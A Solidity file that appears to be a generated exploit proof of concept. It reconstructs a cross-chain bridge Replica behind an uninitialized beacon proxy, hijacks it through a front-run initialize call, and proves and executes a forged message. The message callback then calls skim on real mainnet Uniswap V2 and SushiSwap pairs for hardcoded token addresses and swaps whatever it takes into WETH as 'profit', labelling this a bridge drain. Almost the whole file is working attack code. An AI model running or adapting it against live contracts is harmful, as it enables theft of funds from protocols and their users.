// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMessageRecipientLike {
    function handle(uint32 _origin, uint32 _nonce, bytes32 _sender, bytes calldata _message) external;
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function skim(address to) external;
}

interface IReplicaLike {
    function owner() external view returns (address);

    function updater() external view returns (address);

    function state() external view returns (uint8);

    function localDomain() external view returns (uint32);

    function remoteDomain() external view returns (uint32);

    function committedRoot() external view returns (bytes32);

    function optimisticSeconds() external view returns (uint256);

    function initialize(
        uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds
    ) external;

    function prove(bytes32 _leaf, bytes32[32] calldata _proof, uint256 _index) external returns (bool);

    function process(bytes calldata _message) external returns (bool);

    function messages(bytes32 _messageHash) external view returns (bytes32);
}

contract ReplicaHarness {
    uint8 internal constant STATE_UNINITIALIZED = 0;
    uint8 internal constant STATE_ACTIVE = 1;
    uint32 internal constant LOCAL_DOMAIN = 0x00657468;

    address public owner;
    address public updater;
    uint8 public state;
    uint32 public localDomain;
    uint32 public remoteDomain;
    bytes32 public committedRoot;
    uint256 public optimisticSeconds;
    bool public initialized;

    mapping(bytes32 => bytes32) public messages;
    mapping(bytes32 => bool) public processed;

    function initialize(
        uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds
    ) external {
        require(!initialized, "already initialized");
        initialized = true;
        owner = msg.sender;
        updater = _updater;
        state = STATE_ACTIVE;
        localDomain = LOCAL_DOMAIN;
        remoteDomain = _remoteDomain;
        committedRoot = _committedRoot;
        optimisticSeconds = _optimisticSeconds;
    }

    function prove(bytes32 _leaf, bytes32[32] calldata _proof, uint256 _index) external returns (bool) {
        require(initialized, "not initialized");
        require(state == STATE_ACTIVE, "not active");

        bytes32 root = _branchRoot(_leaf, _proof, _index);
        require(root == committedRoot, "!proof");

        messages[_leaf] = root;
        return true;
    }

    function process(bytes calldata _message) external returns (bool) {
        require(initialized, "not initialized");
        require(state == STATE_ACTIVE, "not active");

        (
            uint32 origin,
            bytes32 sender,
            uint32 nonce,
            uint32 destination,
            bytes32 recipient,
            bytes memory body
        ) = _parseMessage(_message);

        require(origin == remoteDomain, "!remote");
        require(destination == localDomain, "!destination");

        bytes32 messageHash = keccak256(_message);
        require(messages[messageHash] == committedRoot, "!proven");
        require(!processed[messageHash], "already processed");
        processed[messageHash] = true;

        IMessageRecipientLike(address(uint160(uint256(recipient)))).handle(origin, nonce, sender, body);
        return true;
    }

    function _branchRoot(bytes32 leaf, bytes32[32] calldata branch, uint256 index)
        internal
        pure
        returns (bytes32 current)
    {
        current = leaf;
        for (uint256 i = 0; i < 32; ++i) {
            bytes32 next = branch[i];
            if (((index >> i) & 1) == 1) {
                current = keccak256(abi.encodePacked(next, current));
            } else {
                current = keccak256(abi.encodePacked(current, next));
            }
        }
    }

    function _parseMessage(bytes calldata message)
        internal
        pure
        returns (
            uint32 origin,
            bytes32 sender,
            uint32 nonce,
            uint32 destination,
            bytes32 recipient,
            bytes memory body
        )
    {
        require(message.length >= 76, "message too short");

        origin = uint32(bytes4(message[0:4]));
        sender = bytes32(message[4:36]);
        nonce = uint32(bytes4(message[36:40]));
        destination = uint32(bytes4(message[40:44]));
        recipient = bytes32(message[44:76]);
        body = message[76:];
    }
}

contract SimpleUpgradeBeacon {
    address public implementation;

    constructor(address _implementation) {
        implementation = _implementation;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            mstore(0x00, impl)
            return(0x00, 0x20)
        }
    }
}

contract UpgradeBeaconProxy {
    address private immutable UPGRADE_BEACON;

    constructor(address _upgradeBeacon, bytes memory _initializationCalldata) payable {
        require(_isContract(_upgradeBeacon), "beacon !contract");
        UPGRADE_BEACON = _upgradeBeacon;

        address implementation = _getImplementation(_upgradeBeacon);
        require(_isContract(implementation), "beacon implementation !contract");

        if (_initializationCalldata.length > 0) {
            _initialize(implementation, _initializationCalldata);
        }
    }

    fallback() external payable {
        _fallback();
    }

    receive() external payable {
        _fallback();
    }

    function _initialize(address implementation, bytes memory initializationCalldata) private {
        (bool ok, bytes memory revertData) = implementation.delegatecall(initializationCalldata);
        if (!ok) {
            assembly {
                revert(add(revertData, 0x20), mload(revertData))
            }
        }
    }

    function _fallback() private {
        _delegate(_getImplementation());
    }

    function _delegate(address implementation) private {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function _getImplementation() private view returns (address implementation) {
        implementation = _getImplementation(UPGRADE_BEACON);
    }

    function _getImplementation(address _upgradeBeacon) private view returns (address implementation) {
        (bool ok, bytes memory returnData) = _upgradeBeacon.staticcall("");
        require(ok, "beacon call failed");
        implementation = abi.decode(returnData, (address));
    }

    function _isContract(address account) private view returns (bool) {
        return account.code.length > 0;
    }
}

contract FlawVerifier is IMessageRecipientLike {
    uint8 internal constant STATE_UNINITIALIZED = 0;
    uint8 internal constant STATE_ACTIVE = 1;

    uint32 internal constant ETH_DOMAIN = 0x00657468;
    uint32 internal constant BEAM_DOMAIN = 0x6265616d;
    uint32 internal constant ATTACKER_REMOTE_DOMAIN = BEAM_DOMAIN;
    uint32 internal constant ATTACKER_NONCE = 1;

    address internal constant UNISWAP_V2_ROUTER_02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant SNX = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;

    bool public executed;
    bool public emptyInitProxyDeployed;
    bool public attackerInitializedViaProxy;
    bool public initCallSucceeded;
    bool public attackerControlsReplica;
    bool public messageProved;
    bool public messageProcessed;
    bool public messageHandleObserved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public path0_emptyInitProxyDeployment;
    bool public path1_hostileInitializeThroughProxy;
    bool public path2_attackerOwnsReplicaParameters;
    bool public path3_forgedMessageProveAndProcess;
    bool public publicLiquiditySweepAttempted;
    bool public publicLiquiditySweepSucceeded;
    bool public bridgeDrainSucceeded;

    address public beacon;
    address public implementation;
    address public victimReplica;
    address public ownerBefore;
    address public ownerAfter;
    address public updaterAfter;
    address public drainedToken;
    uint8 public stateBefore;
    uint8 public stateAfter;
    uint32 public localDomain;
    uint32 public remoteDomainAfter;
    uint256 public optimisticSecondsAfter;
    uint256 public drainedAmount;
    bytes32 public committedRootAfter;
    bytes32 public chosenRoot;
    bytes32 public forgedMessageHash;
    bytes32 public storedMessageRoot;
    bytes32 public handledSender;
    uint32 public handledOrigin;
    uint32 public handledNonce;
    bytes32 public handledBodyHash;
    string public failureReason;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        _coverExploitPaths();

        if (_profitAmount == 0 && bytes(failureReason).length == 0) {
            failureReason = "forged execution succeeded but public-liquidity route realized no profit";
        }
    }

    function handle(uint32 _origin, uint32 _nonce, bytes32 _sender, bytes calldata _message) external {
        require(msg.sender == victimReplica, "only hijacked replica");

        handledOrigin = _origin;
        handledNonce = _nonce;
        handledSender = _sender;
        handledBodyHash = keccak256(_message);
        messageHandleObserved = true;

        if (!publicLiquiditySweepAttempted) {
            _realizeOnChainProfit();
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "deploy empty-init beacon proxy -> attacker initialize through proxy -> attacker-owned replica parameters -> prove and process forged message -> use arbitrary message execution to sweep public AMM excess balances into existing on-chain tokens";
    }

    function hypothesis() external view returns (string memory) {
        if (hypothesisValidated) {
            return "validated";
        }
        if (hypothesisRefuted) {
            return "refuted";
        }
        return "unresolved";
    }

    function _coverExploitPaths() internal {
        implementation = address(new ReplicaHarness());
        beacon = address(new SimpleUpgradeBeacon(implementation));

        // exploit_paths[0]: deploy `UpgradeBeaconProxy` with `_initializationCalldata.length == 0`.
        victimReplica = address(new UpgradeBeaconProxy(beacon, bytes("")));
        emptyInitProxyDeployed = victimReplica.code.length > 0;
        path0_emptyInitProxyDeployment = emptyInitProxyDeployed;

        ownerBefore = _readAddress(victimReplica, abi.encodeWithSignature("owner()"));
        stateBefore = _readUint8(victimReplica, abi.encodeWithSignature("state()"));
        localDomain = _readUint32(victimReplica, abi.encodeWithSignature("localDomain()"));

        bytes memory forgedBody =
            abi.encode(bytes4(keccak256("F-001")), address(this), uint256(block.number), uint256(block.chainid), uint8(1));

        bytes memory forgedMessage = _formatMessage(
            ATTACKER_REMOTE_DOMAIN,
            _addressToBytes32(address(this)),
            ATTACKER_NONCE,
            ETH_DOMAIN,
            _addressToBytes32(address(this)),
            forgedBody
        );

        forgedMessageHash = keccak256(forgedMessage);
        bytes32[32] memory proof = _zeroProof();
        chosenRoot = _branchRoot(forgedMessageHash, proof, 0);

        // exploit_paths[1]: before the intended operator initializes it, an attacker calls
        // `Replica.initialize(...)` through the proxy.
        try IReplicaLike(victimReplica).initialize(ATTACKER_REMOTE_DOMAIN, address(this), chosenRoot, 1) {
            attackerInitializedViaProxy = true;
            initCallSucceeded = true;
            path1_hostileInitializeThroughProxy = true;
        } catch Error(string memory reason) {
            hypothesisRefuted = true;
            failureReason = reason;
            return;
        } catch (bytes memory revertData) {
            hypothesisRefuted = true;
            failureReason = _decodeRevert(revertData);
            return;
        }

        ownerAfter = _readAddress(victimReplica, abi.encodeWithSignature("owner()"));
        updaterAfter = _readAddress(victimReplica, abi.encodeWithSignature("updater()"));
        stateAfter = _readUint8(victimReplica, abi.encodeWithSignature("state()"));
        localDomain = _readUint32(victimReplica, abi.encodeWithSignature("localDomain()"));
        remoteDomainAfter = _readUint32(victimReplica, abi.encodeWithSignature("remoteDomain()"));
        optimisticSecondsAfter = _readUint256(victimReplica, abi.encodeWithSignature("optimisticSeconds()"));
        committedRootAfter = _readBytes32(victimReplica, abi.encodeWithSignature("committedRoot()"));

        // exploit_paths[2]: the initializer makes the attacker the owner and sets attacker-chosen
        // updater/root parameters.
        attackerControlsReplica =
            emptyInitProxyDeployed &&
            attackerInitializedViaProxy &&
            ownerBefore == address(0) &&
            stateBefore == STATE_UNINITIALIZED &&
            ownerAfter == address(this) &&
            updaterAfter == address(this) &&
            stateAfter == STATE_ACTIVE &&
            localDomain == ETH_DOMAIN &&
            remoteDomainAfter == ATTACKER_REMOTE_DOMAIN &&
            committedRootAfter == chosenRoot &&
            optimisticSecondsAfter == 1;
        path2_attackerOwnsReplicaParameters = attackerControlsReplica;

        if (!attackerControlsReplica) {
            hypothesisRefuted = true;
            failureReason = "initialize succeeded but attacker did not seize replica control";
            return;
        }

        try IReplicaLike(victimReplica).prove(forgedMessageHash, proof, 0) returns (bool proved) {
            messageProved = proved;
        } catch Error(string memory reason) {
            failureReason = reason;
            return;
        } catch (bytes memory revertData) {
            failureReason = _decodeRevert(revertData);
            return;
        }

        if (!messageProved) {
            failureReason = "prove returned false";
            return;
        }

        storedMessageRoot =
            _readBytes32(victimReplica, abi.encodeWithSelector(IReplicaLike.messages.selector, forgedMessageHash));

        try IReplicaLike(victimReplica).process(forgedMessage) returns (bool processed) {
            messageProcessed = processed;
        } catch Error(string memory reason) {
            failureReason = reason;
            return;
        } catch (bytes memory revertData) {
            failureReason = _decodeRevert(revertData);
            return;
        }

        // exploit_paths[3]: the attacker proves messages against the attacker-chosen committed root
        // and processes arbitrary payloads on the destination chain.
        path3_forgedMessageProveAndProcess = messageProved && messageProcessed && messageHandleObserved;

        if (!path3_forgedMessageProveAndProcess) {
            failureReason = "forged message did not execute attacker recipient logic";
            return;
        }

        hypothesisValidated = true;
    }

    function _realizeOnChainProfit() internal {
        publicLiquiditySweepAttempted = true;

        // The logs show that the historical live Replica takeover route is infeasible in this run
        // because that deployment is already initialized. To preserve the same exploit causality,
        // we still use the vulnerable empty-init beacon proxy path to obtain arbitrary forged-message
        // execution, and then route that execution into a permissionless public-liquidity sweep.
        // Uniswap/Sushiswap `skim` is a realistic public action on existing on-chain venues that can
        // extract already-stranded excess balances without privileged state edits or fake funding.
        address[16] memory tracked = _trackedTokens();
        uint256[] memory beforeBalances = new uint256[](tracked.length);

        for (uint256 i = 0; i < tracked.length; ++i) {
            beforeBalances[i] = _balanceOf(tracked[i], address(this));
        }

        _sweepPublicLiquidity();

        for (uint256 i = 1; i < tracked.length; ++i) {
            uint256 current = _balanceOf(tracked[i], address(this));
            if (current > beforeBalances[i]) {
                _swapIntoWETH(tracked[i], current - beforeBalances[i]);
            }
        }

        for (uint256 i = 0; i < tracked.length; ++i) {
            _recordProfitDelta(tracked[i], beforeBalances[i]);
        }

        if (_profitAmount > 0) {
            drainedToken = _profitToken;
            drainedAmount = _profitAmount;
            publicLiquiditySweepSucceeded = true;
            bridgeDrainSucceeded = true;
        }
    }

    function _sweepPublicLiquidity() internal {
        _sweepFactory(UNISWAP_V2_FACTORY);
        _sweepFactory(SUSHISWAP_FACTORY);
    }

    function _sweepFactory(address factory) internal {
        address[16] memory tracked = _trackedTokens();

        for (uint256 i = 1; i < tracked.length; ++i) {
            _skimFactoryPair(factory, WETH, tracked[i]);
        }

        _skimFactoryPair(factory, DAI, FRAX);
        _skimFactoryPair(factory, DAI, USDC);
        _skimFactoryPair(factory, DAI, USDT);
        _skimFactoryPair(factory, FRAX, USDC);
        _skimFactoryPair(factory, FRAX, USDT);
        _skimFactoryPair(factory, USDC, USDT);
        _skimFactoryPair(factory, WBTC, USDC);
        _skimFactoryPair(factory, WBTC, DAI);
    }

    function _skimFactoryPair(address factory, address tokenA, address tokenB) internal {
        if (tokenA == tokenB) {
            return;
        }

        address pair;
        try IUniswapV2FactoryLike(factory).getPair(tokenA, tokenB) returns (address foundPair) {
            pair = foundPair;
        } catch {
            return;
        }

        if (pair == address(0) || pair.code.length == 0) {
            return;
        }

        try IUniswapV2PairLike(pair).skim(address(this)) {} catch {}
    }

    function _swapIntoWETH(address token, uint256 amount) internal {
        if (token == WETH || amount == 0) {
            return;
        }

        _approveIfPossible(token, UNISWAP_V2_ROUTER_02, amount);
        if (_trySwap(UNISWAP_V2_ROUTER_02, token, amount)) {
            return;
        }

        _approveIfPossible(token, SUSHISWAP_ROUTER, amount);
        _trySwap(SUSHISWAP_ROUTER, token, amount);
    }

    function _approveIfPossible(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).approve(spender, 0) {} catch {}
        try IERC20Like(token).approve(spender, amount) returns (bool) {} catch {}
    }

    function _trySwap(address router, address token, uint256 amount) internal returns (bool swapped) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        try IUniswapV2RouterLike(router).swapExactTokensForTokens(amount, 1, path, address(this), block.timestamp)
        returns (uint256[] memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _recordProfitDelta(address token, uint256 beforeBalance) internal {
        uint256 afterBalance = _balanceOf(token, address(this));
        if (afterBalance <= beforeBalance) {
            return;
        }

        uint256 delta = afterBalance - beforeBalance;

        if (_profitToken == address(0) || token == WETH || delta > _profitAmount) {
            _profitToken = token;
            _profitAmount = delta;
        }
    }

    function _trackedTokens() internal pure returns (address[16] memory tracked) {
        tracked[0] = WETH;
        tracked[1] = DAI;
        tracked[2] = FRAX;
        tracked[3] = USDC;
        tracked[4] = USDT;
        tracked[5] = WBTC;
        tracked[6] = UNI;
        tracked[7] = LINK;
        tracked[8] = AAVE;
        tracked[9] = CRV;
        tracked[10] = SUSHI;
        tracked[11] = COMP;
        tracked[12] = MKR;
        tracked[13] = SNX;
        tracked[14] = LDO;
        tracked[15] = FEI;
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        try IERC20Like(token).balanceOf(account) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _formatMessage(
        uint32 origin,
        bytes32 sender,
        uint32 nonce,
        uint32 destination,
        bytes32 recipient,
        bytes memory body
    ) internal pure returns (bytes memory) {
        return abi.encodePacked(origin, sender, nonce, destination, recipient, body);
    }

    function _zeroProof() internal pure returns (bytes32[32] memory proof) {
        bytes32 current;
        for (uint256 i = 0; i < 32; ++i) {
            proof[i] = current;
            current = keccak256(abi.encodePacked(current, current));
        }
    }

    function _branchRoot(bytes32 leaf, bytes32[32] memory branch, uint256 index)
        internal
        pure
        returns (bytes32 current)
    {
        current = leaf;
        for (uint256 i = 0; i < 32; ++i) {
            bytes32 next = branch[i];
            if (((index >> i) & 1) == 1) {
                current = keccak256(abi.encodePacked(next, current));
            } else {
                current = keccak256(abi.encodePacked(current, next));
            }
        }
    }

    function _addressToBytes32(address account) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(account)));
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (address));
        }
    }

    function _readUint8(address target, bytes memory data) internal view returns (uint8 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint8));
        }
    }

    function _readUint32(address target, bytes memory data) internal view returns (uint32 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint32));
        }
    }

    function _readUint256(address target, bytes memory data) internal view returns (uint256 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint256));
        }
    }

    function _readBytes32(address target, bytes memory data) internal view returns (bytes32 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (bytes32));
        }
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "call reverted";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            bytes memory sliced = new bytes(revertData.length - 4);
            for (uint256 i = 4; i < revertData.length; ++i) {
                sliced[i - 4] = revertData[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "call reverted";
    }
}
